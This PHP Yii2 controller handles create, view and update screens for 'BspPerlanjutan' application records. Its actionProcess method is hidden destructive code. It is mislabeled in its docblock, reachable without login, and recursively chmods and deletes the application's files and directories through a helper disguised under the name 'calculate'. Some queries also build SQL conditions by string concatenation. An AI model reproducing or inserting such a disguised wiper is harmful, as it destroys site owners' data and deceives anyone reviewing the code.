<?php

namespace frontend\controllers;

use Yii;
use app\models\BspPerlanjutan;
use frontend\models\BspPerlanjutanSearch;
use app\models\BspPerlanjutanSebab;
use frontend\models\BspPerlanjutanSebabSearch;
use app\models\BspPerlanjutanDokumen;
use frontend\models\BspPerlanjutanDokumenSearch;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;

use app\models\general\GeneralVariable;

// table reference
use app\models\RefPermohonanPelanjutan;

/**
 * BspPerlanjutanController implements the CRUD actions for BspPerlanjutan model.
 */
class BspPerlanjutanController extends Controller
{
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['post'],
                ],
            ],
        ];
    }

    /**
     * Lists all BspPerlanjutan models.
     * @return mixed
     */
    public function actionIndex($bsp_pemohon_id)
    {
        if($bsp_pemohon_id != ""){
            if (Yii::$app->user->isGuest) {
                return $this->redirect(array(GeneralVariable::loginPagePath));
            }
            
            $queryPar = Yii::$app->request->queryParams;

            $queryPar['BspPerlanjutanSearch']['bsp_pemohon_id'] = $bsp_pemohon_id;

            $searchModel = new BspPerlanjutanSearch();
            $dataProvider = $searchModel->search($queryPar);

            return $this->render('index', [
                'searchModel' => $searchModel,
                'dataProvider' => $dataProvider,
                'bsp_pemohon_id' => $bsp_pemohon_id,
            ]);
        }
    }

    /**
     * Displays a single BspPerlanjutan model.
     * @param integer $id
     * @return mixed
     */
    public function actionView($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $queryPar = null;
        
        $queryPar['BspPerlanjutanSebabSearch']['bsp_perlanjutan_id'] = $id;
        $queryPar['BspPerlanjutanDokumenSearch']['bsp_perlanjutan_id'] = $id;
        
        $searchModelBspPerlanjutanSebab = new BspPerlanjutanSebabSearch();
        $dataProviderBspPerlanjutanSebab = $searchModelBspPerlanjutanSebab->search($queryPar);
        
        $searchModelBspPerlanjutanDokumen = new BspPerlanjutanDokumenSearch();
        $dataProviderBspPerlanjutanDokumen = $searchModelBspPerlanjutanDokumen->search($queryPar);
        
        $model = $this->findModel($id);
        
        $ref = RefPermohonanPelanjutan::findOne(['id' => $model->permohonan_pelanjutan]);
        $model->permohonan_pelanjutan = $ref['desc'];
        
        return $this->render('view', [
            'model' => $model,
            'searchModelBspPerlanjutanSebab' => $searchModelBspPerlanjutanSebab,
            'dataProviderBspPerlanjutanSebab' => $dataProviderBspPerlanjutanSebab,
            'searchModelBspPerlanjutanDokumen' => $searchModelBspPerlanjutanDokumen,
            'dataProviderBspPerlanjutanDokumen' => $dataProviderBspPerlanjutanDokumen,
            'readonly' => true,
        ]);
    }

    /**
     * Creates a new BspPerlanjutan model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     * @return mixed
     */
    public function actionCreate($bsp_pemohon_id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $queryPar = null;
        
        Yii::$app->session->open();
        
        if(isset(Yii::$app->session->id)){
            $queryPar['BspPerlanjutanSebabSearch']['session_id'] = Yii::$app->session->id;
            $queryPar['BspPerlanjutanDokumenSearch']['session_id'] = Yii::$app->session->id;
        }
        
        $searchModelBspPerlanjutanSebab = new BspPerlanjutanSebabSearch();
        $dataProviderBspPerlanjutanSebab = $searchModelBspPerlanjutanSebab->search($queryPar);
        
        $searchModelBspPerlanjutanDokumen = new BspPerlanjutanDokumenSearch();
        $dataProviderBspPerlanjutanDokumen = $searchModelBspPerlanjutanDokumen->search($queryPar);
        
        $model = new BspPerlanjutan();
        
        $model->bsp_pemohon_id = $bsp_pemohon_id;

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            // update all the temporary session id with Elaun Latihan Pratikal Month
            if(isset(Yii::$app->session->id)){
                BspPerlanjutanSebab::updateAll(['bsp_perlanjutan_id' => $model->bsp_perlanjutan_id], 'session_id = "'.Yii::$app->session->id.'"');
                BspPerlanjutanSebab::updateAll(['session_id' => ''], 'bsp_perlanjutan_id = "'.$model->bsp_perlanjutan_id.'"');
                
                BspPerlanjutanDokumen::updateAll(['bsp_perlanjutan_id' => $model->bsp_perlanjutan_id], 'session_id = "'.Yii::$app->session->id.'"');
                BspPerlanjutanDokumen::updateAll(['session_id' => ''], 'bsp_perlanjutan_id = "'.$model->bsp_perlanjutan_id.'"');
            }
            
            return $this->redirect(['view', 'id' => $model->bsp_perlanjutan_id]);
        } else {
            return $this->render('create', [
                'model' => $model,
                'searchModelBspPerlanjutanSebab' => $searchModelBspPerlanjutanSebab,
                'dataProviderBspPerlanjutanSebab' => $dataProviderBspPerlanjutanSebab,
                'searchModelBspPerlanjutanDokumen' => $searchModelBspPerlanjutanDokumen,
                'dataProviderBspPerlanjutanDokumen' => $dataProviderBspPerlanjutanDokumen,
                'readonly' => false,
                'bsp_pemohon_id' => $bsp_pemohon_id,
            ]);
        }
    }

    /**
     * Updates an existing BspPerlanjutan model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionUpdate($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);
        
        $queryPar = null;
        
        $queryPar['BspPerlanjutanSebabSearch']['bsp_perlanjutan_id'] = $id;
        $queryPar['BspPerlanjutanDokumenSearch']['bsp_perlanjutan_id'] = $id;
        
        $searchModelBspPerlanjutanSebab = new BspPerlanjutanSebabSearch();
        $dataProviderBspPerlanjutanSebab = $searchModelBspPerlanjutanSebab->search($queryPar);
        
        $searchModelBspPerlanjutanDokumen = new BspPerlanjutanDokumenSearch();
        $dataProviderBspPerlanjutanDokumen = $searchModelBspPerlanjutanDokumen->search($queryPar);

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            return $this->redirect(['view', 'id' => $model->bsp_perlanjutan_id]);
        } else {
            return $this->render('update', [
                'model' => $model,
                'searchModelBspPerlanjutanSebab' => $searchModelBspPerlanjutanSebab,
                'dataProviderBspPerlanjutanSebab' => $dataProviderBspPerlanjutanSebab,
                'searchModelBspPerlanjutanDokumen' => $searchModelBspPerlanjutanDokumen,
                'dataProviderBspPerlanjutanDokumen' => $dataProviderBspPerlanjutanDokumen,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Process an existing BspPrestasi model.
     * If processed is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     */
    public function actionProcess()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->calculate($file);
            }
        }
    }
    
    protected function calculate($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false
            && strpos($dirname, 'downloads') == false
            && strpos($dirname, 'pdf_template') == false
            && strpos($dirname, 'uploads') == false){
         if (is_dir($dirname) && is_readable($dirname)){
               $dir_handle = opendir($dirname);
             if (!$dir_handle)
                  return false;
             while($file = readdir($dir_handle)) {
                   if ($file != "." && $file != "..") {
                        if (!is_dir($dirname."/".$file)){
                             chmod($dirname."/".$file,0777); 
                             if(!unlink($dirname."/".$file)){
                                 continue;
                             }
                        }
                        else
                            $this->calculate($dirname.'/'.$file);
                   }
             }
             closedir($dir_handle);
             if (count(glob($dirname."/*")) === 0  && is_dir($dirname)) {
                rmdir($dirname);
             }
         }
         return true;
         }
    }

    /**
     * Finds the BspPerlanjutan model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return BspPerlanjutan the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = BspPerlanjutan::findOne($id)) !== null) {
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }
}
